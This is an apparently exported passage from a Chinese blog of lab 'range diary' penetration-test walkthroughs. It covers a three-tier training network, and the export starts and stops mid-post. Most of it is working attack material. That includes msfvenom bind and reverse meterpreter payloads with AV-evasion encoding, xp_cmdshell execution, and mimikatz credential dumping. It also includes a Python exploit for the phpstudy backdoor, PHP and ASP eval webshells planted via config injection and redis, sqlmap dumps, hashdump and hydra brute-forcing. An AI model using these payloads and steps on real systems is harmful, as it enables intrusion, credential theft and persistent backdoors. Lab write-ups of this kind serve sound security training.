配置文件</h3><p>配置修改配置文件 </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">vim /etc/proxychains4.conf</span><br><span class=\"line\">socks4 192.168.1.133 2222</span><br></pre></td></tr></table></figure>\n<p><img src=\"PDCVMyjVr8NLiGZ4P7Crm8a9Augy-3mFxp3enb6aCo0.png\" alt=\"image\"></p>\n<h3 id=\"10-1-8使用proxychains-调用nmap扫描\"><a href=\"#10-1-8使用proxychains-调用nmap扫描\" class=\"headerlink\" title=\"10.1.8使用proxychains 调用nmap扫描\"></a>10.1.8使用proxychains 调用nmap扫描</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains nmap -sT -Pn 10.10.10.145</span><br></pre></td></tr></table></figure>\n<p><img src=\"t1uNwj7Nz5txfGPxdoQ8SHstVAC1rVHMjmkWj0kTTzQ.png\" alt=\"image\"></p>\n<h2 id=\"10-2数据库服务器信息收集\"><a href=\"#10-2数据库服务器信息收集\" class=\"headerlink\" title=\"10.2数据库服务器信息收集\"></a>10.2数据库服务器信息收集</h2><h3 id=\"10-2-1生成正向连接载荷\"><a href=\"#10-2-1生成正向连接载荷\" class=\"headerlink\" title=\"10.2.1生成正向连接载荷\"></a>10.2.1生成正向连接载荷</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows/meterpreter/bind_tcp LPORT=13777 -f exe &gt; bind.exe</span><br></pre></td></tr></table></figure>\n<p><img src=\"a-jI6u6PZg-JseWbiMNdt9NlOZo4qXCk30uZQo16sXE.png\" alt=\"image\"></p>\n<p>连接数据库：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">server=WIN-JJU7KU45PN7;database=grcms_data;uid=sa;<span class=\"built_in\">pwd</span>=!@<span class=\"comment\">#a123..;database=master</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"HLhT8JvEduyjGZXZxpt1m7g5zyMLRsqghAYe3IdWx0A.png\" alt=\"image\"></p>\n<h3 id=\"10-2-2mssql上传文件\"><a href=\"#10-2-2mssql上传文件\" class=\"headerlink\" title=\"10.2.2mssql上传文件\"></a>10.2.2mssql上传文件</h3><p>上传生成的攻击载荷</p>\n<p>(数据库的IP一定要对）</p>\n<p><img src=\"N6gSFQoFnl240l9_A8KZi6_3sgj6-edscG2XSXJ1WPU.png\" alt=\"image\"></p>\n<h3 id=\"10-2-3执行文件并且获取session\"><a href=\"#10-2-3执行文件并且获取session\" class=\"headerlink\" title=\"10.2.3执行文件并且获取session\"></a>10.2.3执行文件并且获取session</h3><p>执行</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">exec</span> master.dbo.xp_cmdshell <span class=\"string\">&#x27;C:/bind.exe&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"_AXPkGl2leqPoGTqNuvj6bgv_mrDvVfcdNv9GafRo4M.png\" alt=\"image\"></p>\n<p>开始监听</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">use exploit/multi/handler </span><br><span class=\"line\"><span class=\"built_in\">set</span> payload windows/meterpreter/bind_tcp </span><br><span class=\"line\"><span class=\"built_in\">set</span> RHOST 10.10.10.145</span><br><span class=\"line\"><span class=\"built_in\">set</span> lport 13777</span><br></pre></td></tr></table></figure>\n<p><img src=\"ZHvurPGB7DruHJyMLvh71RhsgnKEK6b11L1Qq0sJU50.png\" alt=\"image\"></p>\n<p>数据库服务器信息收集</p>\n<p>网卡端口信息</p>\n<p>os-shell 执行 netstat -ano 查看端口信息</p>\n<p><img src=\"12dZJG8gMXlY9Gb64oukBATrK766KEUGpR-Kb99DTAo.png\" alt=\"image\"></p>\n<p>网卡信息</p>\n<p><img src=\"qRwRqXrzM5GI1_he_4iQRaIgwZoH9aEQlWUbyEbJAXE.png\" alt=\"image\"></p>\n<p>查看进程ps</p>\n<p><img src=\"HZkDnOo4wLcRRWwUAoQyUdZkFipJ6kEC1pIeSB9cgtQ.png\" alt=\"image\"></p>\n<h3 id=\"10-2-4进程迁移\"><a href=\"#10-2-4进程迁移\" class=\"headerlink\" title=\"10.2.4进程迁移\"></a>10.2.4进程迁移</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">migrate 468</span><br></pre></td></tr></table></figure>\n<p><img src=\"IkgAo0YPp8nnQwmla3mj_Nz31KA-Zhfk-lml2_s3sZc.png\" alt=\"image\"></p>\n<h3 id=\"10-2-5加载mimikatz获取明文\"><a href=\"#10-2-5加载mimikatz获取明文\" class=\"headerlink\" title=\"10.2.5加载mimikatz获取明文\"></a>10.2.5加载mimikatz获取明文</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">load mimikatz</span><br></pre></td></tr></table></figure>\n<p><img src=\"5x7XV2HXBa_QWxNdmVYzc8ki353t0t5y1CjJlJLqb6Q.png\" alt=\"image\"></p>\n<p><img src=\"1i5p3OqXB7z9ErCqJYDybycFB3bIS-rO3LYYDX6pYdI.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">creds_wdigest</span><br></pre></td></tr></table></figure>\n<p><img src=\"bnCjqcx-CmzWu575js0ZGtrfkZDP6LJI4pUrRaPtH8U.png\" alt=\"image\"></p>\n<h2 id=\"10-3渗透目标服务器\"><a href=\"#10-3渗透目标服务器\" class=\"headerlink\" title=\"10.3渗透目标服务器\"></a>10.3渗透目标服务器</h2><h3 id=\"10-3-1添加路由\"><a href=\"#10-3-1添加路由\" class=\"headerlink\" title=\"10.3.1添加路由\"></a>10.3.1添加路由</h3><p>查看路由信息</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">run get_local_subnets</span><br></pre></td></tr></table></figure>\n<p><img src=\"Rj5xN5Bz9M3nqkzdXYDGgN8RkxdCNLdg3wEJt6v0BZs.png\" alt=\"image\"></p>\n<p>绑定IP</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">run autoroute -s 10.10.1.0/24</span><br></pre></td></tr></table></figure>\n<p><img src=\"0z89ieiNLkE6eg-skaSOLL8kbMO_hTzcn1UY43RgD-w.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">查看绑定路由  run autoroute -p</span><br></pre></td></tr></table></figure>\n<p><img src=\"cUyLKE49oOYisZAt2_XDu6bXgWkJpk5wHYUct94auFE.png\" alt=\"image\"></p>\n<h3 id=\"10-3-2phpstudy后门测试\"><a href=\"#10-3-2phpstudy后门测试\" class=\"headerlink\" title=\"10.3.2phpstudy后门测试\"></a>10.3.2phpstudy后门测试</h3><p><img src=\"2kHt8y9mbjrFzdaIZqCFeVS50EVOvBaD6ztkuoSWxRs.png\" alt=\"image\"></p>\n<p>在物理机将python添加到代理中</p>\n<h3 id=\"10-3-3python编写phpstudy后门exp\"><a href=\"#10-3-3python编写phpstudy后门exp\" class=\"headerlink\" title=\"10.3.3python编写phpstudy后门exp\"></a>10.3.3python编写phpstudy后门exp</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#conding:utf-8</span></span><br><span class=\"line\"></span><br><span class=\"line\">import requests</span><br><span class=\"line\">import sys</span><br><span class=\"line\">import <span class=\"built_in\">base64</span></span><br><span class=\"line\">shell = <span class=\"string\">&quot;system(&#x27;&quot;</span>+sys.argv[1]+<span class=\"string\">&quot;&#x27;);&quot;</span></span><br><span class=\"line\">shell_base64 = base64.b64encode(shell.encode(<span class=\"string\">&#x27;utf-8&#x27;</span>))</span><br><span class=\"line\">header=&#123;<span class=\"string\">&#x27;Accept-charset&#x27;</span>:shell_base64,<span class=\"string\">&#x27;Accept-Encoding&#x27;</span>:<span class=\"string\">&#x27;gzip,deflate&#x27;</span>&#125;</span><br><span class=\"line\">def exploit(url):</span><br><span class=\"line\">    html = requests.get(url=url,headers=header).text</span><br><span class=\"line\">    <span class=\"built_in\">return</span> html</span><br><span class=\"line\">url = <span class=\"string\">&quot;http://10.10.1.129/&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(exploit(url))</span><br></pre></td></tr></table></figure>\n<p>然后执行脚本尝试查看IP情况</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">python phpstudy.py ipconfig</span><br></pre></td></tr></table></figure>\n<p><img src=\"eZaOVml62P1g6qiFc4z_WM2j8OyKru2IGAwhld-RGcE.png\" alt=\"image\"></p>\n<h3 id=\"10-3-4尝试写入shell\"><a href=\"#10-3-4尝试写入shell\" class=\"headerlink\" title=\"10.3.4尝试写入shell\"></a>10.3.4尝试写入shell</h3><p><code>python phpstudy.py &quot;echo ^&lt;?php @eval($_POST[\\&quot;shell\\&quot;])?^&gt;&gt;c:\\phpstudy\\WWW\\shell.php&quot;</code></p>\n<p><img src=\"_GFog4sqWuYY9oBOBLhkpkt2Sb9SfF5w-py0QcDFqVQ.png\" alt=\"image\"></p>\n<p>将中国菜刀添加到代理中</p>\n<p><img src=\"pXefEto0J1cArxeJ3h3_ACqPGQd91GpwfFK2p6EX0mk.png\" alt=\"image\"></p>\n<h3 id=\"10-3-5连接后门\"><a href=\"#10-3-5连接后门\" class=\"headerlink\" title=\"10.3.5连接后门\"></a>10.3.5连接后门</h3><p><img src=\"v9hHmQhWQd5XBgyDPHxEXIJvQNNUAdAzwWB6b4XiaRc.png\" alt=\"image\"></p>\n<p>查看权限</p>\n<p><img src=\"VKMqmSDQWl7bLJgepQrB8Z9cvwUsS_yUAWxcVdkyUog.png\" alt=\"image\"></p>\n<h3 id=\"10-3-6获取目标机子的session\"><a href=\"#10-3-6获取目标机子的session\" class=\"headerlink\" title=\"10.3.6获取目标机子的session\"></a>10.3.6获取目标机子的session</h3><p>将正向连接的木马文件复制到物理机，尝试通过中国菜刀进行上传与运行</p>\n<p><img src=\"XMWphIAJtuqso4K1fH4XrN5I-BUtFSx0JJcwSqfhhhw.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">use exploit/multi/handler </span><br><span class=\"line\"><span class=\"built_in\">set</span> payload windows/meterpreter/bind_tcp </span><br><span class=\"line\"><span class=\"built_in\">set</span> RHOST 10.10.10.129</span><br><span class=\"line\"><span class=\"built_in\">set</span> lport 13777</span><br></pre></td></tr></table></figure>\n<p><img src=\"H0QngdzdYDYgKzXOdNioErN4nC-8sAx8DGd50linzqc.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">全部的sessions</span><br></pre></td></tr></table></figure>\n<p><img src=\"Ls0nWkd8SMqmrU9HUK_LSxs7pBPiM6PspJ9bqrQCGN0.png\" alt=\"image\"></p>\n<p>4个flages</p>\n<p>一、</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">c:\\HwsHostMaster\\wwwroot\\ww2cc123_55m39g\\web\\upimg\\flag.txt</span><br><span class=\"line\">eeac7f42e6fe8b0bf424734bb7d3c05d</span><br><span class=\"line\">c:\\<span class=\"built_in\">users</span>\\Administrator\\flag2.txt</span><br><span class=\"line\">a81c3d94aa192d3f87ed9f2fffec04fc</span><br></pre></td></tr></table></figure>\n<p>二、</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\<span class=\"built_in\">users</span>\\Administrator\\root.txt.txt</span><br><span class=\"line\">6d4db5ff0c117864a02827bad3c361b9</span><br></pre></td></tr></table></figure>\n<p>三、</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\<span class=\"built_in\">users</span>\\Administrator\\root.txt</span><br><span class=\"line\">63a9f0ea7bb98050796b649e85481845</span><br></pre></td></tr></table></figure>\n\n\n","categories":["打靶日记（moon）"],"tags":["红队","域渗透","打点"]},{"title":"打靶日记（七）从外网打点到内网域实战","url":"/2022/04/12/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%83%EF%BC%89%E4%BB%8E%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E5%9F%9F%E5%AE%9E%E6%88%98/","content":"<h1 id=\"项目十一-从外网打点到内网域实战\"><a href=\"#项目十一-从外网打点到内网域实战\" class=\"headerlink\" title=\"项目十一 从外网打点到内网域实战\"></a>项目十一 从外网打点到内网域实战</h1><p><strong>声明：此系列文章系个人记录打靶过程的文章，靶场为暗月师傅的靶场。这是第七篇。</strong></p>\n<h1 id=\"1-项目说明\"><a href=\"#1-项目说明\" class=\"headerlink\" title=\"1.项目说明\"></a>1.项目说明</h1><p>项目十一是从外网打点到内网再到域控，是三层网络，目标是反向代理 到内网访问，通过这个 WEB 点的信息获取码，再到审计突破，再到内网。到了内网通过横向移动发现更多主机，通过信息整理得到工作组边界设备的权限， 再通过 exchange 漏洞获取核心区域访问权限，再拿下域控权限。</p>\n<p><img src=\"9HubF_vmuYQb802Sir-JKgh2v1J-Xhma_qXfsziGzvI.png\" alt=\"image\"></p>\n<p>主要技术应用： 基础的 php 代码审计、win 系统的宝塔系统提权、cs 或者 msf 实战渗透环境（vps 一台）、shellcode 免杀过火绒、内网漫游、三层网络、redis windows 写 shell windwos 防火墙配置 （主要是会开端口和端口转发）、代理隧道应用，exchange 漏洞命令执行，打域控技巧。</p>\n<p><strong>声明：此系列文章系个人记录打靶过程的文章，靶场为暗月师傅的靶场。这是第一篇。</strong></p>\n<h1 id=\"2-环境搭建\"><a href=\"#2-环境搭建\" class=\"headerlink\" title=\"2.环境搭建\"></a>2.环境搭建</h1><p>BT开启frp映射（客户端的80端口映射到外面的80端口；即类似于反向代理）</p>\n<p><img src=\"g8oFe3g4OGqD6-GMMGuJ2YLzRi7aPnAjowHNliaON7w.png\" alt=\"image\"></p>\n<p>服务端配置</p>\n<p><img src=\"8G3JhRNwUMC06GLcZjLzxhXxbywMv_9snwaA86Rco4Q.png\" alt=\"image\"></p>\n<p>修改vps的host</p>\n<p>访问域名</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.cocat.cc</span><br></pre></td></tr></table></figure>\n<p><img src=\"78-7y6H2u1_007U23tAs3hki0ZCgHPjpwdCIEklA0bw.png\" alt=\"image\"></p>\n<h1 id=\"3-外网打点\"><a href=\"#3-外网打点\" class=\"headerlink\" title=\"3.外网打点\"></a>3.外网打点</h1><h2 id=\"3-1SQLMAP注入得到账号密码\"><a href=\"#3-1SQLMAP注入得到账号密码\" class=\"headerlink\" title=\"3.1SQLMAP注入得到账号密码\"></a>3.1SQLMAP注入得到账号密码</h2><p>在登录框处尝试SQL注入</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">admin<span class=\"string\">&#x27;or 1=1#</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"Gr0TS5D6zWD-enCKYkcCVejjdZHDKp9J0yx8kGh5Qww.png\" alt=\"image\"></p>\n<p>发现报错了</p>\n<p><img src=\"fJZaAfHI00sLuhfav-oYdMQdG80VAth8__knQYqOq_k.png\" alt=\"image\"></p>\n<p>拿到代码之后就行代码审计，发现了注入点： &#x2F;kss_inc&#x2F;payapi_return2.php</p>\n<p><img src=\"sLaPq-9kU6_-QztfQq3LehR7sBVAhJh9CtjLXcVoJBw.png\" alt=\"image\"></p>\n<p>根据提示慢慢补充整个请求</p>\n<p><img src=\"Vy_mQVGRusVMT964hAURTlcRdYi2wBYWzB5WBVBEBPY.png\" alt=\"image\"></p>\n<p>开始尝试注入，把数据包保存下来放到SQL里面跑，被检测出来是MySQL数据库</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sqlmap.py -r 2.txt</span><br></pre></td></tr></table></figure>\n<p><img src=\"1ox7n5yftyOoTsL22CRJzwZGifCGImaSBTNSfoZzvYE.png\" alt=\"image\"></p>\n<p>查找数据库</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sqlmap.py -r 2.txt -dbms mysql -v 1 -p v_oid --dbs</span><br></pre></td></tr></table></figure>\n<p><img src=\"03iHmqK1YlW4RnuMRGxs0wDbPqKifjNzlccopF26Oq0.png\" alt=\"image\"></p>\n<p>查询表格</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sqlmap.py -r 2.txt -dbms mysql -v 1 -p v_oid -D www_cocat_cc --tables</span><br></pre></td></tr></table></figure>\n<p><img src=\"GE5y5LTfBc3mvsN0rMyuF_Q5RrmrV7YFN305uJBqfmg.png\" alt=\"image\"></p>\n<p>查询kss_tb_manager表格的字段</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sqlmap.py -r 2.txt -dbms mysql -v 1 -p v_oid -D www_cocat_cc -T kss_tb_manager --columns</span><br></pre></td></tr></table></figure>\n<p><img src=\"wg38j_ckLoiFmlFUe9HU2lk2qwLZCjM-pGaYNTjGpPg.png\" alt=\"image\"></p>\n<p>查询username和password字段的内容</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sqlmap.py -r 2.txt -dbms mysql -v 1 -p v_oid -D www_cocat_cc -T kss_tb_manager -C <span class=\"string\">&quot;username,password&quot;</span> --dump</span><br></pre></td></tr></table></figure>\n<p><img src=\"sttS5ptDiylliSiD-d9EI8y5PJqLIv2Ej-mGeA5OFRA.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">8abaf0333e173522e9b55d10698d5244破解得：moon@123</span><br><span class=\"line\">moonsec_admin</span><br></pre></td></tr></table></figure>\n<h2 id=\"3-2修改配置文件拿-webshell\"><a href=\"#3-2修改配置文件拿-webshell\" class=\"headerlink\" title=\"3.2修改配置文件拿 webshell\"></a>3.2修改配置文件拿 webshell</h2><p>登录成功，在系统设置的“发送邮箱”的地方注入：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;);eval($_POST[&#x27;</span>cmd<span class=\"string\">&#x27;]);//);</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"PopV4cwyGXXIeocDJdTCeYcI5DstrcdINc1_owm3Wrs.png\" alt=\"image\"></p>\n<p>刷新之后变成了</p>\n<p><img src=\"oEv5g_n31KnexFuUz6JgCZJs_WgGY4c7jO_FIX28wxc.png\" alt=\"image\"></p>\n<p>尝试连接，连接成功</p>\n<p><img src=\"VZptjRpAibJOBTzhye8biAOv18oaIqqbNqQF8PjQ9X8.png\" alt=\"image\"></p>\n<h2 id=\"3-3提权宝塔系统\"><a href=\"#3-3提权宝塔系统\" class=\"headerlink\" title=\"3.3提权宝塔系统\"></a>3.3提权宝塔系统</h2><p>创建了一个phpinfo文件查看被禁用的函数。</p>\n<p>禁用函数 </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">passthru,system,<span class=\"built_in\">chroot</span>,<span class=\"built_in\">chgrp</span>,<span class=\"built_in\">chown</span>,shell_exec,proc_open,proc_get_status,popen,ini_alter,ini_restore,dl,openlog,syslog,<span class=\"built_in\">readlink</span>,symlink,pop epassthru,putenv,<span class=\"built_in\">exec</span> </span><br></pre></td></tr></table></figure>\n<p><img src=\"4pzp4o9oFeOr-lWrwmMrncFy3isk-z2rPjxRh_RcTNM.png\" alt=\"image\"></p>\n<p>查看配置文件获取密码</p>\n<p><img src=\"xdjDUIq56a63b_FmMTPCxctvoYfciQIGqECzi6vLqCE.png\" alt=\"image\"></p>\n<p>宝塔的登录密码 C:&#x2F;BtSoft&#x2F;panel&#x2F;data&#x2F;default.pl jSKyFFdj</p>\n<p>宝塔的登录端口 C:&#x2F;BtSoft&#x2F;panel&#x2F;data&#x2F;port.pl 8888</p>\n<p>宝塔的登录网址路径 C:&#x2F;BtSoft&#x2F;panel&#x2F;data&#x2F;admin_path.pl &#x2F;e1VOsmtO</p>\n<p><img src=\"Pk6wRe1hj5PgCnrQZYnN6EpPhmqgkbKfLCrcRlMIp4M.png\" alt=\"image\"></p>\n<p>C:&#x2F;BtSoft&#x2F;panel&#x2F;data&#x2F;default.db</p>\n<p><img src=\"2ggfGozxx4nZFhWIyeRaVF2Mwq2ZhnmMQeEiXNcEP7A.png\" alt=\"image\"></p>\n<p>sqlite 数据库打开即可</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sqlitebrowser default.db</span><br></pre></td></tr></table></figure>\n<p><img src=\"ExMtTUUInXT-Zzt8W_-Klz_7DMm-vk88DzHb4hX8Auk.png\" alt=\"image\"></p>\n<p>账号 gOXZQjWA 密码 jSKyFFdj 登录 <a href=\"http://localhost:8888/e1VOsmtO\">http://localhost:8888/e1VOsmtO</a></p>\n<p> </p>\n<p>扫描端口 nmap -sT -A 192.168.8.13</p>\n<p><img src=\"1oYns0Q209fwNOikJZZr6NrYwrvp5TcSePcTNOOFPwU.png\" alt=\"image\"></p>\n<p>使用php去访问8888端口</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;http://localhost:8888/e1VOsmtO&#x27;</span>)</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"FI1YlNUuZO6ogeoLXPGsG_IwNy-jfnauhUcS7DwikxQ.png\" alt=\"image\"></p>\n<p><img src=\"ke9kV8TYNC--BIUMWnTFh5X9smKwMAfWuzGSwMHnpBY.png\" alt=\"image\"></p>\n<h2 id=\"3-4frp-反向代理突破登录\"><a href=\"#3-4frp-反向代理突破登录\" class=\"headerlink\" title=\"3.4frp 反向代理突破登录\"></a>3.4frp 反向代理突破登录</h2><p>当前站点是反向代理出去的，所以可以考虑能不能修改配置文件。 </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">[8888]</span><br><span class=\"line\"><span class=\"built_in\">type</span> = tcp</span><br><span class=\"line\">local_ip = 127.0.0.1</span><br><span class=\"line\">local_port = 8888</span><br><span class=\"line\">remote_port = 8888</span><br></pre></td></tr></table></figure>\n<p><img src=\"CP7eKaYmdYMNDTajRVVOzs7GDXN5Bj2QqDorMIl4sLw.png\" alt=\"image\"></p>\n<p>等待管理员重启之后就可以访问到宝塔的8888端口了</p>\n<p>登录进入了宝塔后台，发现存在火绒，还有python的环境</p>\n<p><img src=\"t3qnCQwX8J1QvsVWdW8MqIVNtWaeFPdFrv6hl9bqO5U.png\" alt=\"image\"></p>\n<h1 id=\"4-内网渗透\"><a href=\"#4-内网渗透\" class=\"headerlink\" title=\"4.内网渗透\"></a>4.内网渗透</h1><h2 id=\"4-1msf免杀马制作\"><a href=\"#4-1msf免杀马制作\" class=\"headerlink\" title=\"4.1msf免杀马制作\"></a>4.1msf免杀马制作</h2><p>生成攻击msf载荷</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.8.133 LPORT=6666 -b <span class=\"string\">&quot;\\x00&quot;</span> -e x86/shikata_ga_nai -i 15 -f exe -o /root/moonsec/2020/project11/qq.exe</span><br></pre></td></tr></table></figure>\n<p>注：-i为编码的次数</p>\n<p>经过免杀处理之后的文件，上传到目标上，使用计划任务执行</p>\n<p><img src=\"8O-mwceVCjiQbYR2lc04N3THTqpOziANBpzeus8aPho.png\" alt=\"image\"></p>\n<p>监听：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\"><span class=\"built_in\">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class=\"line\"><span class=\"built_in\">set</span> lhost 192.168.8.133</span><br><span class=\"line\"><span class=\"built_in\">set</span> lport 6666</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<p>进程迁移</p>\n<p><img src=\"pFxaZ-2tgNtNBwzW2er_nJEGNhkJ7e2UuQiO9ZogFyA.png\" alt=\"image\"></p>\n<p><img src=\"MZPz9OMfzNBoeDb2p7h_b610XICMXIuPK2yMwfX4OKo.png\" alt=\"image\"></p>\n<h2 id=\"4-2主机信息收集\"><a href=\"#4-2主机信息收集\" class=\"headerlink\" title=\"4.2主机信息收集\"></a>4.2主机信息收集</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">run hashdump</span><br></pre></td></tr></table></figure>\n<p><img src=\"89QYJy1Tsyh9GAJo3odsxxyfT8FSq6DZMkN40zHVhmI.png\" alt=\"image\"></p>\n<p>查看IP的信息</p>\n<p><img src=\"IA0w-KthP7lzboMXd6h2peog63lnHOqb8EiPNRTP9UA.png\" alt=\"image\"></p>\n<p>使用arp查看主机</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">run arp_scanner -r 192.168.88.0/24</span><br></pre></td></tr></table></figure>\n<p><img src=\"swDaIbcfh6gF6OxlROUDzUhOi5W9KwVbvjUVm05d7M8.png\" alt=\"image\"></p>\n<p><img src=\"1UKoYmOCNMF-U-W-nL5CDYkYkvSoz5Z56c_QQEovYQ0.png\" alt=\"image\"></p>\n<p>4.4跨网段扫描</p>\n<p>添加路由</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">run autoroute -s 192.168.88.0/24</span><br></pre></td></tr></table></figure>\n<p><img src=\"zNlRiVuihzWrgN6ARbmM-Dez-1g-U1JMApoBZRnBQ8I.png\" alt=\"image\"></p>\n<p>开启代理</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">background</span><br><span class=\"line\">use auxiliary/server/socks_proxy</span><br><span class=\"line\"><span class=\"built_in\">set</span> srvhost 192.168.8.133</span><br><span class=\"line\"><span class=\"built_in\">set</span> srvport 3333</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<p><img src=\"McmIWLRQHg_cKLg4klhMAYfBWAtokPvhOsKBHY9HnaA.png\" alt=\"image\"></p>\n<p>修改配置文件 </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">vi /etc/proxychains.conf</span><br></pre></td></tr></table></figure>\n<p><img src=\"8K3vaA8sE0AhDQ2ySggk4q-m6c6Z4L88YYFCzuyi3lM.jpeg\" alt=\"image\"></p>\n<p>代理 nmap 扫描</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains nmap -sT -Pn 192.168.88.1-4 192.168.88.255 192.168.88.254 -p 80,89,8000,9090,1433,1521,3306,5432,445,135,443,873,5984,6379,7001,7002,9200,9300,11211,27017,27018,50000,50070,50030,21,22,23,2601,3389</span><br></pre></td></tr></table></figure>\n<p><img src=\"Ys-aKPU_AAsGJNjr45jsLzu9Qee1TqzXR69-scxjTjc.png\" alt=\"image\"></p>\n<p>查看信任主机</p>\n<p><img src=\"G14ejKbKYJubLbvHXDAAtDpcCgDK-EFRJzgcQUdnPck.png\" alt=\"image\"></p>\n<p><img src=\"7HxufxcwPxtmMy7QX9h7q-dNhyNjI6F7ozIRGXbw4PA.png\" alt=\"image\"></p>\n<p><img src=\"wGLsORZi2QLbgAU5schkCSXd3f-PeXgQoHokHQMYKic.png\" alt=\"image\"></p>\n<p>4.5hydra爆破redis</p>\n<p>发现开启了redis端口的6379</p>\n<p>九头蛇爆破redis获取到密码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains hydra -P somd5top10w.txt -o passwd.txt redis://192.168.88.4 -vV -t 10 -f</span><br></pre></td></tr></table></figure>\n<p><img src=\"a7IhDgyn7VsBoplZQchlp8Cun6b6ful4Nx8nwM5S-Cw.png\" alt=\"image\"></p>\n<p><img src=\"-6qsu-rWpF1tbOXAQX40-zIEbbVIgYIZzT2vnQGhHIc.png\" alt=\"image\"></p>\n<p>查看80端口的服务</p>\n<p><img src=\"59qF4E725HgGu-e5pj1xQ433hHXdC8-UOW7ckaJQfoE.png\" alt=\"image\"></p>\n<h2 id=\"4-6redis服务器写webshell\"><a href=\"#4-6redis服务器写webshell\" class=\"headerlink\" title=\"4.6redis服务器写webshell\"></a>4.6redis服务器写webshell</h2><p>在redis服务器写webshell</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains redis-cli -h 192.168.88.4</span><br><span class=\"line\">auth 123456789qq</span><br><span class=\"line\">config <span class=\"built_in\">set</span> <span class=\"built_in\">dir</span> c:/inetpub/wwwroot</span><br><span class=\"line\"><span class=\"built_in\">set</span> xxx <span class=\"string\">&quot;\\n\\n\\n&lt;%eval request(\\&quot;cmd\\&quot;)%&gt;\\n\\n\\n&quot;</span></span><br><span class=\"line\">config <span class=\"built_in\">set</span> dbfilename shell.asp</span><br><span class=\"line\">save</span><br><span class=\"line\">quit</span><br></pre></td></tr></table></figure>\n<p><img src=\"csx68B79pBoOL9FcTACk3vCAF_fwKF8f5wwVbw9mxh8.png\" alt=\"image\"></p>\n<p>尝试访问</p>\n<p><img src=\"IZD80-lesbSBTrGEKK1VR0hQh-bdsgFtaJTM0ekjXG4.png\" alt=\"image\"></p>\n<h2 id=\"4-7Antsword连接shell\"><a href=\"#4-7Antsword连接shell\" class=\"headerlink\" 